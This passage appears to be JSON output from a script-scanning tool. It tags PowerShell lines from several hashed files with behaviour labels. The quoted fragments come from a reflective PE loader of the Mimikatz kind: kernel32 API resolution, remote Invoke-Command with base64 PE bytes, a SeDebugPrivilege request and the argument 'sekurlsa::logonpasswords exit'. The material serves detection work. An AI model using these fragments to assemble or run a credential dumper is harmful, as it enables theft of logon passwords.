                                "Write-Error \"PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS.\" -ErrorAction Stop"
                            ],
                            "name": "action:Process/Get"
                        },
                        {
                            "lines": [
                                "Start-Sleep -Seconds 1"
                            ],
                            "name": "action:Process/Start"
                        },
                        {
                            "lines": [
                                "$GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')"
                            ],
                            "name": "action:Win32.Library/Get"
                        },
                        {
                            "lines": [
                                "$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))",
                                "$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, \"GetProcAddress\") #Kernel32 loaded to the same address for all processes"
                            ],
                            "name": "action:Win32.Library/GetProcAddress"
                        },
                        {
                            "lines": [
                                "$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, \"LoadLibraryA\") #Kernel32 loaded to the same address for all processes"
                            ],
                            "name": "action:Win32.Library/Load"
                        },
                        {
                            "lines": [
                                "$Processors = Get-WmiObject -Class Win32_Processor"
                            ],
                            "name": "action:Wmi.Object/Get"
                        },
                        {
                            "lines": [
                                "$HostName = $([System.Net.Dns]::GetHostByName(($env:computerName)).HostName);"
                            ],
                            "name": "observable:command.extrinsic"
                        },
                        {
                            "lines": [
                                "Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs) -ComputerName $ComputerName"
                            ],
                            "name": "observable:computer.name"
                        },
                        {
                            "lines": [
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000"
                            ],
                            "name": "observable:encoding.binary"
                        },
                        {
                            "lines": [
                                "$HostName = $([System.Net.Dns]::GetHostByName(($env:computerName)).HostName);"
                            ],
                            "name": "observable:environment.variable"
                        },
                        {
                            "lines": [
                                "$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges",
                                "$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread",
                                "$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread",
                                "$DllList = @(\"msvcr70d.dll\", \"msvcr71d.dll\", \"msvcr80d.dll\", \"msvcr90d.dll\", \"msvcr100d.dll\", \"msvcr110d.dll\", \"msvcr70.dll\" `",
                                "$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary",
                                "$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread",
                                "$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread",
                                "$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA",
                                "$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress",
                                "$GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress",
                                "$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf",
                                "$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process",
                                "$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(\"kernel32.dll\")",
                                "$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA",
                                "$LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree",
                                "$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA",
                                "$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx",
                                "$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess",
                                "$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken",
                                "$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory",
                                "$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc",
                                "$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx",
                                "$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree",
                                "$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx",
                                "$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect",
                                "$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject",
                                "$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory",
                                "$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy",
                                "$memsetAddr = Get-ProcAddress msvcrt.dll memset",
                                ", \"msvcr71.dll\", \"msvcr80.dll\", \"msvcr90.dll\", \"msvcr100.dll\", \"msvcr110.dll\")",
                                "Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }",
                                "[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(\"Kernel32.dll\")",
                                "[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke(\"KernelBase.dll\")",
                                "[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke(\"mscoree.dll\")"
                            ],
                            "name": "observable:file.pe"
                        },
                        {
                            "lines": [],
                            "name": "observable:obfuscation.backtick"
                        },
                        {
                            "lines": [
                                "$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, \"SeDebugPrivilege\", $PLuid)"
                            ],
                            "name": "observable:redTeam.Nishang.AccessControl/PrivilegeEscalation"
                        },
                        {
                            "lines": [
                                "$ExeArgs = \"sekurlsa::logonpasswords exit\""
                            ],
                            "name": "observable:redTeam.Nishang.Authentication/CredentialAccess"
                        }
                    ],
                    "length": 2661696,
                    "timestamp": "2024-08-01T15:54:09.838Z"
                },
                {
                    "hash": "54FBFAA213590110012529A41C4555C45D497616EF93201F9FC3B0D216FF9794",
                    "intentions": [
                        {
                            "lines": [
                                "Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs)",
                                "Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs) -ComputerName $ComputerName"
                            ],
                            "name": "action:Command/Invoke"
                        },
                        {
                            "lines": [
                                "Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs) -ComputerName $ComputerName"
                            ],
                            "name": "observable:computer.name"
                        },
                        {
                            "lines": [
                                "$ExeArgs = \"sekurlsa::logonpasswords exit\""
                            ],
                            "name": "observable:redTeam.Nishang.Authentication/CredentialAccess"
                        }
                    ],
                    "length": 2517431,
                    "timestamp": "2024-08-01T15:54:09.995Z"
                },
                {
                    "hash": "9132B19D05284463B4B428132530A93D2368604512EA9087F00FF5AC94D2D6FF",
                    "intentions": [
                        {
                            "lines": [
                                "$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)",
                                "$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)",
                                "$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])",
                                "$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])",
                                "$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))",
                                "$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)",
                                "$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)",
                                "$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))",
                                "$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))",
                                "$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])",
                                "$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])",
                                "$Parameters = (New-Object Type[](0)),",
                                "$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])",
                                "$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)",
                                "$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))",
                                "$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))",
                                "$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)",
                                "$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)",
                                "$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)",
                                "$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)",
                                "Write-Verbose \"Calling function with WString return type\"",
                                "[...]d-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))",
                                "[...]nedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))",
                                "[...]ntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))",
                                "[...]onHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))",
                                "[...]onHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))",
                                "[...]tr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))",
                                "[...]tr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))",
                                "[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])",
                                "[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])",
                                "[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])",
                                "[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))",
                                "[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])",
                                "[OutputType([Type])]",
                                "[Type[]]",
                                "[Type]",
                                "[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])",
                                "[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)",
                                "[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)",
                                "if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))",
                                "if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)",
                                "if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)"
                            ],
                            "name": "action:Content/Get"
                        },
                        {
                            "lines": [
                                "[Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)",
                                "[Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)"
                            ],
                            "name": "action:DotNet.Base64/Convert"
                        },
                        {
                            "lines": [
                                "$OSVersion = [Environment]::OSVersion.Version",
                                "if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {"
                            ],
                            "name": "action:DotNet.Environment/Use"
                        },
                        {
                            "lines": [
                                "$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)",
                                "$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)",
                                "$ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)",
                                "$DllCharacteristicsType = $TypeBuilder.CreateType()",
                                "$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()",
                                "$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()",
                                "$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()",
                                "$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()",
                                "$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()",
                                "$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()",
                                "$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()",
                                "$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()",
                                "$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()",
                                "$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()",
                                "$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()",
                                "$LUID = $TypeBuilder.CreateType()",
                                "$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()",
                                "$MachineType = $TypeBuilder.CreateType()",
                                "$MagicType = $TypeBuilder.CreateType()",
                                "$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)",
                                "$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)",
                                "$SubSystemType = $TypeBuilder.CreateType()",
                                "$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()",
                                "$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])",
                                "$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])",
                                "$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])",
                                "$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])",
                                "$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)",
                                "$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null",
                                "$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null",
                                "$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null",
                                "$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null",
                                "$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null",
                                "$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null",
                                "$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null",
                                "$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null",
                                "$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null",
                                "$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')",
                                "$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')",
                                "$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')",
                                "($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null",
                                "($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null",
                                "($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null",
                                "($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null",
                                "($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null",
                                "($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null",
                                "($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null",
                                "($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null",
                                "($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null",
                                "($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null",
                                "($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null",
                                "($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null",
                                "($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null",
                                "($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null",
                                "($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null",
                                "($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null",
                                "($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null",
                                "($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null",
                                "($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null",
                                "($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null",
                                "($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null",
                                "($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null",
                                "($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null",
                                "($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null",
                                "($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null",
                                "($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null",
                                "($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null",
                                "($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null",
